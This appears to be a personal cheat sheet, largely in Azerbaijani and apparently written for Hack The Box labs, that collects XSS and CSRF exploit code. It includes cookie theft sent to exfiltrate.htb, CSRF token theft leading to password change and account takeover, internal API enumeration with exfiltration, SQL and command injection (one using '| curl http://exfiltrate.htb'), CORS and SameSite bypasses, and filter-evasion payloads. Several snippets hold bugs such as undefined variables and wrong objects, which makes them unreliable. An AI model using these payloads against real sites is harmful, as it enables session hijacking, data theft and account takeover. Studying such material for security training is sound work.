# Advanced XSS və CSRF Exploitation - Kod Nümunələri

## Məlumat Oğurlamaq üçün Nümunə

```javascript
// Məlumat oğurlamak üçün nümunə
fetch("http://exfiltrate.htb/steal", {
  method: "POST",
  body: "cookie=" + document.cookie + "&url=" + window.location.href,
});
```

## XSS vasitəsilə CSRF Hücumu

```javascript
// XSS vasitəsilə CSRF hücumu
fetch("http://vulnerablesite.htb/change-password", {
  method: "POST",
  credentials: "include",
  body: "new_passwd",
});
```

## CSRF Token ilə Exploit

```javascript
// 1. CSRF token əldə et
// 2. Token ilə həssas əməliyyat yerinə yetir
// 3. Nəticəni exfiltration server-ə göndər
async function exploit() {
  const response = await fetch("/settings");
  const html = await response.text();
  const csrf_token = html.match(/csrf-token" value="([^"]*)"/)[1];

  await fetch("/change-password", {
    method: "POST",
    header: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `csrf_token=${csrf_token}&new_password=salam123!`,
  });

  fetch("http://exfiltrate.htb/", {
    method: "POST",
    body: `token=${token}&action=password_changed`,
  });
}
exploit();
```

## XSS sayəsində Cookies Əldə Et

```javascript
// XSS sayəsində cookies əldə et
const cookie = document.cookie;
fetch("http://exfiltrate.htb/", {
  method: "POST",
  body: `cookie=${encodeURIComponent(cookie)}`,
});
```

## SOP Olmadan Təhlükəsizlik Senaryosu

```javascript
// SOP olmadan Təhlükəsizlik Senaryosu
async function exfiltrate_data(url) {
  const response = await fetch(url, {
    credentials: "include",
  });
  const data = response.text();
  await fetch("https://exfiltrate.htb/exfiltrate?c=" + btoa(data));

  exfiltrate_data("https://mymails.htb/getmails");
  exfiltrate_data("https://mybank.htb/myaccounts");
  exfiltrate_data("https://192.168.178.5/");
}
```

## XMLHttpRequest ilə Data Exfiltrasiyası

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
xhr.withCredentials = true;
xhr.onload = () => {
  location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
};
xhr.send();
```

## Daxili Şəbəkəni Hədəf Almaq

```javascript
//Targeting the local neteork
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://172.16.1.10:8000', true);
xhr.withCredentials = true;
xhr.onload = () => {
  location = "http://exfiltrate.htb/log?data=" + btoa(xhr.response);
};
xhr.send();
```

## Cavab Göndərmənin Effektiv Variantı

```javascript
// Effective variant to send response
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://172.16.1.10:8000', true);
xhr.withCredentials = true;
xhr.onload = () => {
  fetch('http://exfiltrate.htb/log', {
    method: 'POST',
    body: xhr.response
  });
};
xhr.send();
```

## Access-Control-Allow-Credentials ilə İstifadə

```javascript
// Access-Control-Allow-Credentials: true
// Using fetch()
fetch(url, {
  credentials: "include",
});

// Using XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.open("GET", "http://example.com/", true);
xhr.withCredentials = true;
xhr.send(null);
```

## CSRF Token Bypass - CORS Misconfiguration

```javascript
// Defense Bypass: CSRF Tokens. We can read csrf_token fron response message, bsecause 
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

var csrf_req = new XMLHttpRequest();
var params = `promote=htb-stdnt&csrf=${csrftoken}`
csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

## SameSite Strict Bypass

```javascript
/* Same-Site Strick bypass. Bunun ucun client-side redirection olmalidir ve bu olan zaman
biz vulnarablesite-a istek atanda redirect hissesine ozumuze lazim olan hisseni yaziriq ve neticede
sorgu bizim yox saytin adindan gedir

İlk sorğu cross-site olduğu üçün Strict kukini bloklayır.
Amma ikinci sorğunu bank.com-un öz HTML-i başlayır.
Browser buna same-site interaction deyir.
Ona görə də Strict kuki göndərir → CSRF olur.*/ 
document.location = "https://bank.com/redirect.php?next=/transfer.php?amount=1000&to=attacker";
```

## XSS Exploitasiya - HttpOnly Flag ilə

```javascript
// XSS explotation with HttpOnly flag
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.html', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
xhr.open('GET', 'http://exfiltrate.htb/exfil?r=' + btoa(xhr.responseText), false);
exfil.send();
```

## İyileştirilmiş Versiyon

```javascript
// Impruved version
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.html', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
xhr.open('POST', 'http://exfiltrate.htb', false);
exfil.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
var data = "payload=" + encodeURIComponent(btoa(xhr.responseText));
exfil.send(data);
```

## Hesab Ələktronu (Account Takeover)

```javascript
// Account Takeover
// Get CSRF_Token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.html', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrf_token = encodeURIComponent(doc.getElementById("csrf_token").value);

// Get Admin Page
var csrf_req = new XMLHttpRequest();
var params = `username=admin&password=pwned&csrf_token=${csrf_token}`;
csrf_req.open('POST', '/admin.html', false);
csrf_req.setRequestHeader('Content-Type'. 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

## Daxili API-nı Enumerate Etmə

```javascript
// Enumerating the internal API
try {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
  xhr.withCredentials = true;
  xhr.send();
  var msg = xhr.responseText;
} catch(error) {
  var msg = error;
};
var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://exfiltrate.htb/exfil?r=' + btoa(msg), false);
exfil.send();
```

## İyileştirilmiş Daxili API Enumeration

```javascript
// Impruved Enumerating the internal API
var endpoints = ['access-token','account','accounts','amount','balance','balances',
                'bar','baz','bio','bios','category','channel','chart','circular',
                'company','content','contract','coordinate','credentials','creds',
                'custom','customer','customers','details','dir','directory','dob',
                'email','employee','event','favorite','feed','foo','form','github',
                'gmail','group','history','image','info','item','job','link','links',
                'location','log','login','logins','logs','map','member','members',
                'messages','money','my','name','names','news','option','options',
                'pass','password','passwords','phone','picture','pin','post','prod',
                'production','profile','profiles','publication','record','sale',
                'sales','set','setting','settings','setup','site','test','theme',
                'token','tokens','twitter','user','users','version','work','worker','workers'];
for (let endpoint of endpoints) {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/' + endpoint, false);
    xhr.send();
    if (xhr.status === 200){
      var exfil = new XMLHttpRequest();
      exfil.open('GET', 'http://exfiltrate.htb/exfil?e=' + endpoint + '&r=' + btoa(exfil.responseText), false);
      exfil.send();
    }
  } catch (error) {
    // Pass
  }
}
```

## Daxili Veb-Tətbiqatları Exploitasiya I - SQL Injection

```javascript
// Exploiting internal Web Applications I
// ' OR '1'='1'-- -
// ' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -
// ' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -
// ' UNION SELECT id,username,password,info FROM users-- -
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

## Daxili Veb-Tətbiqatları Exploitasiya II - Command Injection

```javascript
// Exploiting internal Web Applications II
var xhr = new XMLHttpRequest();
var param = `webapp_section=${encodeURIComponent("| curl http://exfiltrate.htb?pwn")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
xhr.send(param);

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://exfiltrate.htb/exfil?r=' + btoa(xhr.responseText), false);
exfil.send();
```

## Blacklist Bypass - String Kodlamaları

```javascript
// Bypassing Blacklists
// Unicode
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"
// Octal Encoding
"\141\154\145\162\164\50\61\51"
// Hex Encoding
"\x61\x6c\x65\x72\x74\x28\x31\x29"
// Base64 Encoding
atob("YWxlcnQoMSk=")

// String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)
// .source
/alert(1)/.source
// URL Encoding
decodeURI(/alert(%22xss%22)/.source)
```

## Execution Sink-ləri

```javascript
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()
```

## Kodlanmış String-lər ilə Execution Sink-ləri

```javascript
eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()
```

---

## HTML Payload Nümunələri

### Simple XSRF PoC

```html
<!--Simple XSRF PoC-->
<html>
    <body>
        <form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
        <input type="hidden" name="promote" value="htb-stdt"/>
        <input type="submit" value="Submit request"/>
        </form>
        <script>
            document.form[0].submit();
        </script>
    </body>
</html>
```

### NULL Origin Misconfiguration Bypass

```html
<!--NULL Origin Misconfiguration Bypass-->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
xhr.withCredentials = true;
xhr.onload = () => {
location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
};
xhr.send();
</script>"></iframe>
```

### JSON Sorğu Gövdəsi ilə CSRF

```html
<!--JSON Sorğu Gövdəsi ilə CSRF-->
<form method="POST" action="http://csrf.vulnerablesite.htb/profile.php" enctype="text/plain">
    <input type="hidden" name="{'promote': 'htb-std', 'dummykey" value="': 'dummyvalue}'">
</form>
```

## XSS Filtre Bypass-ləri

### JavaScript İcrasının 3 Yolu

#### 1. Script Tag

```html
<!--1.Script Tag-->
<script>alert(1)</script>
```

#### 2. Pseudo Protokol

```html
<!--2.Pseudo Protocols-->
<a href="javascript:alert(1)">click</a>
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

#### 3. Event Handler

```html
<!--3.Event Handlers-->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Blacklist Bypass

```html
<!--Bypassing Blacklists-->
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
<scr<script>ipt>alert(1);</scr<script>ipt>
<svg/onload=alert(1)>
<script/src="http://exploit.htb/exploit"></script>
```

---

**Sona Catdı** ✓
